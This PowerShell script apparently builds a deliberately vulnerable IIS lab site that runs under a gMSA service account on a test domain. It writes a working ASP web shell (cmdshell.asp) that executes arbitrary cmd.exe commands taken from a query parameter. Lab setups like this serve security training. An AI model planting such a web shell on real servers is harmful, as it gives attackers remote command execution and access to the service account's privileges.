# Stop the DefaultAppPool and disable it, otherwise the default will keep running the new app if it goes into wwwroot
Stop-WebAppPool -Name "DefaultAppPool"
Set-ItemProperty -Path "IIS:\AppPools\DefaultAppPool" -Name "autoStart" -Value $false

# Define variables
$gMSAName = "test_gmsa_iis13$" # Note the $ at the end of the gMSA name
$domain = "test.net" # Replace with your actual domain
$siteName = "MyVulnerableWebsite"
$sitePath = "C:\inetpub\wwwroot\$siteName"
$sitePort = 80
$appPoolName = "MyGMSAAppPool"

# Step 2: Start the IIS service
Start-Service -Name W3SVC

# Create a new application pool if it doesn't already exist
Import-Module WebAdministration

if (-not (Get-WebAppPoolState -Name $appPoolName -ErrorAction SilentlyContinue)) {
    New-WebAppPool -Name $appPoolName
}

# Set the identity of the application pool to the gMSA
Set-ItemProperty IIS:\AppPools\$appPoolName -Name processModel.identityType -Value SpecificUser
Set-ItemProperty IIS:\AppPools\$appPoolName -Name processModel.userName -Value "$domain\$gMSAName"
Set-ItemProperty IIS:\AppPools\$appPoolName -Name processModel.password -Value ""

# Step 5: Create a new website and configure it to use the application pool
if (-not (Test-Path $sitePath)) {
    New-Item -Path $sitePath -ItemType Directory
}

$aspContent = @'
<%@ Language="VBScript" %>
<html>
<body>
<h1>ASP Command Shell</h1>
<form method="get">
    Command: <input type="text" name="cmd">
    <input type="submit" value="Execute">
</form>
<pre>
<%
    Dim command, objShell, objExec, output
    command = Request.QueryString("cmd")
    If command <> "" Then
        Set objShell = CreateObject("WScript.Shell")
        Set objExec = objShell.Exec("cmd.exe /c " & command)
        Do While Not objExec.StdOut.AtEndOfStream
            output = objExec.StdOut.ReadLine()
            Response.Write output & "<br>"
        Loop
        Set objShell = Nothing
        Set objExec = Nothing
    End If
%>
</pre>
</body>
</html>
'@

Set-Content -Path "$sitePath\cmdshell.asp" -Value $aspContent

if (-not (Get-Website -Name $siteName -ErrorAction SilentlyContinue)) {
    New-WebSite -Name $siteName -Port $sitePort -PhysicalPath $sitePath -ApplicationPool $appPoolName
} else {
    Set-ItemProperty "IIS:\Sites\$siteName" -Name applicationPool -Value $appPoolName
}

# Step 6: Set up the application pool (optional)
Set-ItemProperty IIS:\AppPools\$appPoolName -Name processModel.idleTimeout -Value 00:20:00
Set-ItemProperty IIS:\AppPools\$appPoolName -Name recycling.periodicRestart.time -Value 01:00:00


# Move the root application to the new application pool
$rootApplicationPath = "IIS:\Sites\Default Web Site\"
$newAppPool = "MyGMSAAppPool"
Set-ItemProperty -Path $rootApplicationPath -Name "applicationPool" -Value $newAppPool
Write-Host "Root application at '$rootApplicationPath' has been moved to '$newAppPool' application pool."

# Step 7: Restart IIS service to apply changes
Restart-Service -Name W3SVC

# Step 8: Verify the setup
$site = Get-Website | Where-Object { $_.name -eq $siteName }
if ($site) {
    Write-Output "Website $siteName is successfully created and configured."
} else {
    Write-Error "Website $siteName was not created successfully."
}

# Step 9: Verify the application pool identity
$appPool = Get-ItemProperty IIS:\AppPools\$appPoolName
Write-Output "Application pool identity type: $($appPool.processModel.identityType)"
Write-Output "Application pool username: $($appPool.processModel.userName)"

# Step 10: Verify the website's application pool
$websiteAppPool = (Get-ItemProperty "IIS:\Sites\$siteName").applicationPool
Write-Output "Website $siteName is using application pool: $websiteAppPool"
